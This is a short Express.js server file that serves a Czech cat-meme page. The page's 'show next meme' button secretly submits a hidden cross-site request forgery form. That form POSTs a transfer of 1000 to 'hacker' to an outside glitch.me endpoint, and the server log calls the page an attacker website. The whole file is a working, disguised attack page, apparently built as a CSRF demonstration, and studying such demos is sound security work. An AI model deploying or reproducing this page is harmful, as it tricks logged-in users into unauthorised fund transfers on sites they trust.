const express = require("express");
const app = express();
const port = 4000;

app.get("/", (req, res) => {
  res.send(`
    <html>
    <head>
      <title>Memes s kočkami 😸</title>
      <style>
        body {
          font-family: Arial, sans-serif;
          background-color: #fefefe;
          text-align: center;
          padding: 40px;
        }
        img {
          width: 300px;
          border-radius: 10px;
          margin-bottom: 20px;
        }
        button {
          padding: 10px 20px;
          font-size: 16px;
          background-color: #ff6600;
          border: none;
          border-radius: 5px;
          color: white;
          cursor: pointer;
        }
        button:hover {
          background-color: #e65c00;
        }
      </style>
    </head>
    <body>
      <h1>Kočičí humr dne</h1>
      <img src="https://www.books4people.co.uk/cdn/shop/products/TheBestCatMemesEver_800x.jpg?v=1617208289" alt="meme" />
      <br />
      <button onclick="triggerCSRF()">Zobrazit další meme</button>

      <!-- Skrytý CSRF formulář -->
      <form id="csrfForm" action="https://torch-puffy-waste.glitch.me/transfer" method="POST">
        <input type="hidden" name="to" value="hacker" />
        <input type="hidden" name="amount" value="1000" />
      </form>

      <script>
        function triggerCSRF() {
          document.getElementById("csrfForm").submit();
        }
      </script>
    </body>
    </html>
  `);
});

app.listen(port, () => {
  console.log("Interaktivni utocnicky web bezi na http://localhost:" + port);
});
